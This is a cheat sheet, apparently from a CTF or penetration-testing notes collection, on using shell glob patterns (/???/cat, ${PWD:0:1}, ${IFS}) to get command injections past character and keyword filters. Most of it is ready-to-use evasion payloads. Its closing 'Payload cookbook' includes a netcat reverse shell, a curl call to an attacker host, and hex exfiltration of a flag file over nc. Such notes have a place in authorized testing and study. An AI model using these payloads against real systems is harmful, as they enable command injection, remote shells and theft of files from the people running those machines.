# Wildcard & Globbing — letting the filesystem name the command

## Glob basics — the shell expands patterns at exec time

`?` = one char, `*` = any run, `[abc]`/`[a-z]` = char class, `{a,b}` =
brace alternatives (bash/zsh only).

The shell expands globs in argv words BEFORE exec — `/???/cat` becomes
`/bin/cat` when the glob matches uniquely — the literal `cat` never
appears in the command string.

## The `/bin` alphabet — single-char substitution

| You can't type | Glob that resolves | To |
|---|---|---|
| `cat` | `/???/cat` | `/bin/cat` (also `/usr/bin/cat`? — no, `[a-z]` narrows) |
| `cat` | `/???/c?t` | `/bin/cat` |
| `cat` | `/???/c* t`... | no — `*` spans |
| `cat` | `/???/[bc]?t` | `/bin/cat` |
| `id` | `/???/id` or `/???/?d` | `/usr/bin/id` or `/bin/id` |
| `sh` | `/???/s?` | `/bin/sh` |
| `bash` | `/???/ba??` | `/bin/bash` |
| `nc` | `/???/n?` | may hit `netstat` too — check |
| `whoami` | `/???/????mi` | |
| `flag` | `/fl*`, `/?lag`, `/???g` | `/flag` |
| `passwd` | `/???/???swd` | `/etc/passwd` — `/???` hits /etc, etc |
| `curl` | `/???/cur?` | |
| `wget` | `/???/w?et` | |

Ambiguity: `/???/n?` matches `nc`, `ns`, `nt`, `nm`, `nl`... — if the glob
matches >1 file the shell expands ALL matches → the first becomes the
command, the rest become args — usually harmless or breaks weirdly.

## `?` vs `*` tradeoffs

- `?` is precise — exactly one char position
- `*` is loose — `/???/c*` matches `cat`, `cp`, `curl`, `chown`... risky
- `[a-z]` narrows the char set — `/???/[a-z]at` avoids `cat`-only → same

## Path-level globbing — replacing `/`

`/???/cat` still needs `/` chars — but they come from typing `/`... wait,
the point is the glob replaces NAMES not the slashes. If `/` itself is
filtered: `${PWD:0:1}` or `${HOME:0:1}` substitute — `char-restriction.md`.

Combine: `${PWD:0:1}???${PWD:0:1}cat` — no literal `/`, no literal `cat`.

## `{a,b}` brace expansion — the no-space command

`{cat,/flag}` → `cat /flag` — bash/zsh only. `sh`/dash don't brace-expand.

```
{c,at}     → c at  (two words — wrong)
{cat,/flag} → cat /flag  (two words — RIGHT)
{c,a}t     → ct at  (wrong — splits char)
```

Brace produces SPACE-SEPARATED words — use for args not names.

## Globs in args — not just command names

```
cat /???/pass??       → cat /etc/passwd
cat /???/flag*        → cat /flag*
cat /*                → every root file as args (noise)
ls -la /???           → lists matching dirs
```

## Glob + quoted names — expansion happens INSIDE unquoted context only

`cat "/???/cat"` — glob inside double quotes does NOT expand. Globs
expand only unquoted. So the pattern must be OUTSIDE any quotes — inject
without quote-wrap or after closing them.

## Counting `?` — precision matters

`/???/cat` needs EXACTLY 3 chars in dir + literal `cat`. `/??/cat` won't
match `/bin` (3 chars). For unknown paths:

```
/???/cat — /bin
/???????/cat — /usr/bin (7)
/????/cat — /sbin
```

Try `/*/*/cat`-style for deeper paths.

## The "glob needs the file to exist" precondition

Globs match existing files only — `/???/cat` fails if `/bin` doesn't
exist on the box or `cat` isn't in it. BusyBox puts everything under
`/bin/busybox` — applets resolve as `/bin/cat`→busybox symlink usually
still exists.

## Payload cookbook

```
/???/cat /???/passwd          → cat /etc/passwd
/???/cat${IFS}/???/passwd     — no spaces
/???/c?t${IFS}/fl*            — glob the flag name too
$(/???/cat /fl*)              — substitution + glob
/???/wh?ami                   → whoami
/???/nc -e /???/sh YOU 80     → reverse shell
/???/cu?? http://YOU/         → curl
/???/xxd -p /flag|/???/nc YOU 80 — hex exfil over nc
```

## When globs don't help — bash `nullglob`/failglob

- `nullglob` set → unmatched glob expands to nothing → command runs
  with no arg — quiet failure, confusing
- `failglob` set → unmatched glob → error
- neither set → unmatched glob passed literally → arg is literally
  `/???/cat` — the target command fails on the weird path

The error message distinguishes: `No such file or directory: /???/cat`
= glob failed to match, not a filter.

## Falsifiers

- `?`/`*`/`[` all filtered AND no other char-building route
- argv boundary — globs in argv still expand? — NO! If argv-built
  (`execFile`), no shell means no globbing — literal `?` lands.
  Globbing itself is a shell feature — seeing `?` expand confirms the
  shell boundary.

## Output to record

- which glob pattern resolved (the arg error echoing the expanded name
  is free confirmation)
